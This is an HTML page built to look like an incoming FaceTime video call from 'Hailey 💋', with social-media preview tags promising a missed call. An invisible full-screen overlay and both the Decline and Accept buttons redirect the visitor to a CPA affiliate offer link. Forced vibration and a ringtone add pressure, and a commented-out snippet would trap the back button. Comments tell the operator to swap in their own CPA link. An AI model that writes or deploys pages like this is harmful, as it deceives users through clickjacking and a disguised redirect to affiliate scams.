<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Incoming Video Call...</title>
    
    <!-- Open Graph tags for social media preview -->
    <meta property="og:title" content="📲 Missed Video Call from Hailey">
    <meta property="og:description" content="Tap to call back now.">
    <meta property="og:image" content="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; user-select: none; }
        
        body, html { 
            height: 100%; 
            width: 100%; 
            background-color: #000; 
            overflow: hidden; 
        }

        /* Background image with blur to simulate camera/environment */
        .bg-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true') no-repeat center center;
            background-size: cover;
            filter: blur(15px) brightness(0.4);
            z-index: 1;
            transform: scale(1.1); /* Prevents white edges from blur */
        }

        /* Main UI Container */
        .call-ui {
            position: relative;
            z-index: 10;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 50px 20px;
            color: white;
        }

        /* Top Header */
        .header-text {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 1px;
            color: #d1d5db;
            text-transform: uppercase;
        }

        /* Caller Profile Area */
        .caller-info {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: -10vh;
        }

        .avatar-container {
            position: relative;
            width: 130px;
            height: 130px;
            margin-bottom: 20px;
        }

        .avatar {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
            animation: pulse-ring 2s infinite ease-in-out;
        }

        .caller-name {
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 8px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .call-status {
            font-size: 18px;
            color: #4ade80; /* Light green */
            font-weight: 400;
            animation: blink 1.5s infinite;
        }

        /* Bottom Action Buttons */
        .action-buttons {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 320px;
            padding-bottom: 30px;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            cursor: pointer;
        }

        .btn {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            border: none;
            outline: none;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }

        .btn:active {
            transform: scale(0.9);
        }

        .btn-decline {
            background-color: #ef4444; /* Red */
        }

        .btn-accept {
            background-color: #22c55e; /* Green */
            animation: jump 2s infinite;
        }

        /* SVG Icons for buttons */
        .btn svg {
            width: 35px;
            height: 35px;
            fill: white;
        }

        .btn-label {
            font-size: 14px;
            font-weight: 500;
            color: #fff;
        }

        /* Animations */
        @keyframes pulse-ring {
            0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
            70% { box-shadow: 0 0 0 20px rgba(255, 255, 255, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        @keyframes jump {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-15px); }
            60% { transform: translateY(-7px); }
        }

        /* Invisible overlay to catch ALL clicks on the screen */
        .click-trap {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- This invisible div ensures ANY click on the screen redirects to your CPA link -->
    <div class="click-trap" onclick="goToOffer()"></div>

    <div class="bg-image"></div>

    <div class="call-ui">
        <div class="header-text">FaceTime Video</div>

        <div class="caller-info">
            <div class="avatar-container">
                <img src="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true" alt="Hailey" class="avatar">
            </div>
            <h2 class="caller-name">Hailey 💋</h2>
            <div class="call-status">Incoming call...</div>
        </div>

        <div class="action-buttons">
            <!-- Decline Button -->
            <div class="btn-container" onclick="goToOffer()">
                <button class="btn btn-decline">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/>
                    </svg>
                </button>
                <span class="btn-label">Decline</span>
            </div>

            <!-- Accept Button -->
            <div class="btn-container" onclick="goToOffer()">
                <button class="btn btn-accept">
                    <svg viewBox="0 0 24 24">
                        <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
                    </svg>
                </button>
                <span class="btn-label">Accept</span>
            </div>
        </div>
    </div>

    <!-- Audio Element for Ringtone (Requires user interaction first on most modern browsers, but works great if they came from an interstitial) -->
    <audio id="ringtone" loop>
        <source src="https://www.soundjay.com/phone/cell-phone-ringtone-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        // Replace this with your actual CPA link
        const targetCpaLink = "https://bedjfha.hubss.one/p/uyMfR";

        // Function to redirect the user
        function goToOffer() {
            window.location.href = targetCpaLink;
        }

        // Vibrate API (Works on Android devices to give a real phone vibration feel)
        function startVibration() {
            if (navigator.vibrate) {
                // Vibrate for 1000ms, pause for 500ms, repeat
                navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
            }
        }

        // Try to play ringtone and start vibration on page load
        window.onload = function() {
            startVibration();
            
            // Note: Browsers block autoplay audio without user interaction. 
            // We try to play it, but catch the error quietly if it fails.
            const audio = document.getElementById('ringtone');
            audio.volume = 0.5;
            let playPromise = audio.play();
            
            if (playPromise !== undefined) {
                playPromise.catch(error => {
                    // Auto-play was prevented. This is normal.
                    console.log("Audio autoplay blocked by browser.");
                });
            }
        };

        // Trap: If they try to go back, we can optionally push them to the offer anyway
        // (Uncomment the lines below if you want aggressive redirection on back button)
        /*
        window.history.pushState("no-back", null, "");
        window.onpopstate = function() {
            goToOffer();
        };
        */
    </script>
</body>
</html>
